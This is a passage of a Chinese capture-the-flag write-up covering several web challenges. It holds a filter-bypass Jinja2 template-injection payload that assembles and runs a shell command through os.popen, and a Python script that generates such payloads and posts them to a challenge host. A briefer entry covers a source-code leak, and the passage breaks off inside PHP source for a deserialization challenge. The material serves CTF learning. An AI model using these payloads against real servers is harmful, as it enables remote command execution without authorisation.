<p><img src="https://img-blog.csdnimg.cn/d8a9ca545e6d41df9e13375ff8a2a8f4.png" alt="6"><br><img src="https://img-blog.csdnimg.cn/c5d8870ec29a4b3599c606cbff32dca9.png" alt="7"><br><img src="https://img-blog.csdnimg.cn/106cfa10d2934b5887fc065029a1886f.png" alt="8"><br>成功执行。FUZZ测试一下过滤了哪些字符<br><img src="https://img-blog.csdnimg.cn/6799efdd8ebf402abcbf0bce782a6c80.png" alt="9"></p>
<blockquote>
<p>过滤字符如上。</p>
</blockquote>
<p>参考博客<a href="https://blog.csdn.net/weixin_52635170/article/details/129856818">绕过姿势</a><br>先把数字全给获取了。<br><img src="https://img-blog.csdnimg.cn/b1e9d4878b3142b1a1155b16fc9ee167.png" alt="1"><br>然后开始<strong>拼接payload</strong><br>参考<a href="https://blog.csdn.net/Jayjay___/article/details/130186511">wp</a>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 首先构造出所需的数字: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> zero <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 0, 也可以使用lenght过滤器获取数字</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> one <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">**</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 1</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> two <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 2</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> four <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 4</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> five <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 5</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> three <span class="token operator">=</span> five<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 3</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> nine <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">-</span>five<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 9</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> seven <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 7</span>

<span class="token comment"># 构造出所需的各种字符与字符串: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> space <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 空格</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point <span class="token operator">=</span> self<span class="token operator">|</span><span class="token builtin">float</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># .</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>c<span class="token operator">=</span>aa<span class="token punctuation">)</span><span class="token operator">|</span>reverse<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 字符 c</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfh <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span>urlencode<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 百分号 %</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfhc <span class="token operator">=</span> bfh<span class="token operator">~</span>c <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> slas <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>seven<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造斜杠 /</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> yin <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>three<span class="token operator">~</span>nine<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造引号 '</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> xhx <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">~</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造下划线 _</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> right <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造右括号 )</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> left <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造左括号 (</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> but <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>aa<span class="token punctuation">,</span>tins<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> imp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>aa<span class="token punctuation">,</span>ort<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># import</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pon <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>aa<span class="token punctuation">,</span>pen<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># popen</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> so <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># os</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ca <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ca<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># cat</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> l <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>l<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>           <span class="token comment">#ls     //&#123;%%0cset%0cls%0c=%0cdict(l=aa,s=dd)|join%0c%&#125;</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> flg <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>fl<span class="token operator">=</span>aa<span class="token punctuation">,</span>ag<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># flag</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ev <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>aa<span class="token punctuation">,</span>al<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> red <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>re<span class="token operator">=</span>aa<span class="token punctuation">,</span>ad<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># read</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bul <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>but<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># __builtins__</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ini <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># init</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> glo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>aa<span class="token punctuation">,</span>bals<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> itm <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ite<span class="token operator">=</span>aa<span class="token punctuation">,</span>ms<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># items</span>

<span class="token comment"># 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pld <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>imp<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>so<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>pon<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>ca<span class="token operator">~</span>space<span class="token operator">~</span>slas<span class="token operator">~</span>flg<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>red<span class="token operator">~</span>left<span class="token operator">~</span>right <span class="token operator">%</span><span class="token punctuation">&#125;</span>

<span class="token comment"># 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> <span class="token punctuation">(</span>whoami<span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>ini<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>glo<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span> 
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> <span class="token punctuation">(</span>v<span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span>
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span>
                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval("__import__('os').popen('cat /flag').read()")</span>
                <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>还有一个大佬写的脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token keyword">from</span> typing <span class="token keyword">import</span> List

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://node6.anna.nssctf.cn:28298/get_flag"</span><span class="token comment">#记得改地址</span>

<span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
	index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>
	<span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
		n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>
		result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>
		num <span class="token operator">//=</span> <span class="token number">10</span>
		index <span class="token operator">+=</span> <span class="token number">1</span>
	<span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>


num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>
	<span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>
	<span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>
	<span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>
	<span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>
	<span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>
	<span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>
	<span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>
	<span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>
	<span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>
		<span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;
&#123;% set zero=one-one %&#125;
&#123;% set two=one+one %&#125;
&#123;% set three=one+two %&#125;
&#123;% set four=two*two %&#125;
&#123;% set five=three+two %&#125;
&#123;% set six=three*two %&#125;
&#123;% set seven=one+six %&#125;
&#123;% set eight=four*two %&#125;
&#123;% set nine=one+eight %&#125;
&#123;% set ten=five*two %&#125;
&#123;% set pops=dict(p=a,op=a)|join %&#125;
&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;
&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;
&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;
&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;
&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;
&#123;% set evas=dict(ev=a,al=a)|join %&#125;
&#123;% set chs=dict(ch=a,r=a)|join %&#125;
&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;
&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;
&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span>


<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
	<span class="token comment">#return re.findall(f"h3>(.*?)&lt;/h3", response.text, re.S)[0].strip()</span>

c <span class="token operator">=</span> <span class="token string">'cat /flag'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="泄露的伪装"><a href="#泄露的伪装" class="headerlink" title="泄露的伪装"></a>泄露的伪装</h3><p><img src="https://img-blog.csdnimg.cn/4da968b7349444ea8c30fc873afc897b.png" alt="2"><br>主界面也没啥，扫一下目录。<br><img src="https://img-blog.csdnimg.cn/c3c7b6d968f244bc82946f267069f729.png" alt="2"><br>访问test.txt<br><img src="https://img-blog.csdnimg.cn/70c0495b610441e1b57c98ffdc32e62a.png" alt="3"><br>知道源码但要找到对应的php文件。<br>访问<a href="http://www.rar得到路径/">www.rar得到路径</a><br><img src="https://img-blog.csdnimg.cn/0fe65ed76dc94d7e8465f8d472870158.png" alt="6"><br>burp抓包伪协议读取<br><img src="https://img-blog.csdnimg.cn/2dd20719f6054e4b8b4d753112d67505.png" alt="7"></p>
<h3 id="反方向的钟"><a href="#反方向的钟" class="headerlink" title="反方向的钟"></a>反方向的钟</h3><p>反序列化</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// flag.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$rank</span><span class="token punctuation">,</span><span class="token variable">$salary</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">salary</span> <span class="token operator">=</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
